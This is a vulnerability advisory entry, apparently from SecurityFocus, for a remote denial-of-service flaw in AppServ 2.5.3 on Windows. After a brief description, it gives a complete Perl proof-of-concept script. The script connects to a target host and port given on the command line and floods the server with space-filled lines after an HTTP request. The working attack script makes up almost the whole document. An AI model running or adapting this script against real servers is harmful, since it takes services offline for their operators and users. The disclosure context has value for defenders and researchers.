source: http://www.securityfocus.com/bid/15851/info

AppServ Open Project is reportedly affected by a remote denial of service vulnerability.

AppServ 2.5.3 running on Microsoft Windows platforms was reported to be vulnerable. Other versions may be affected as well. 

#Xploit PoC AppServ 2.5.3 "Win32" DoS \\ (0x001)
#appserv-dos.pl
#!C:\Perl\perl.exe
#C:\>perl appserv-dos.pl <tested ip> <port>
#By Rozor - !Sub_Level Security Investigation
#Thank To Miseo
#Tested In LocalHost.

sub banner {
print("--------------------------------------------\n");
print("|                                           |\n");
print("|    Proof Of Concept AppServ 2.5.3 DoS     |\n");
print("|    C:\>appserv-dos.pl <target> <port       |\n");
print("|                                           |\n");
print("|      By Rozor - !Sub_Level Research       |\n");
print("|                                           |\n");
print("---------------------------------------------\n");
}
die banner() unless $ARGV[0];
die banner() unless $ARGV[1];

use IO::Socket::INET;

my $host = $ARGV[0];
my $port = $ARGV[1];
my $space = "\x20";
my $i;
my $l;
my $j;

for ($i=0; $i<8000; $i++)
{
$l.="\x20";
}
print "\n\nAppServ 2.5.3 DoS Proof Of Concept\n .:By Rozor:. !Sub_Level\n";
print "Attack...\n";
my $sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort =>
$port, Proto => 'tcp') ||

die "Error: Conection reused$@\n";
my $buffer="GET / HTTP/1.0\n";
my $m = "$l\n";
send($sock,$buffer,0) || die "Error: Send not found\n";
for($l= 0; $l <8000000000; $l++)
{
print "[ $l - 8000000000 ]\r";
send($sock,$m,0) || die "Error: Send not found\n";
}
print "\nServer DoS Hack\n";
close($sock);

